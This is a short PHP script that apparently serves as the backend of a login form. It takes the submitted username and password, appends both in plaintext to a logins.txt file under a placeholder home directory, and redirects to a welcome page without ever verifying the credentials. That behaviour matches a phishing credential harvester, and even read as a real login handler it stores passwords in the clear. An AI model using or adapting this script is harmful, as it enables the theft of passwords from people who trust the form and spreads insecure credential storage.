<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['pswrd']);

    $filePath = "/home/YOURUSERNAME/logins.txt";

    if ($file = fopen($filePath, "a")) {
        fwrite($file, "Username: $username, Password: $password\n");
        fclose($file);
    }

    header("Location: welcome.php?username=" . urlencode($username));
    exit;
} else {
    echo "Invalid request.";
}
?>
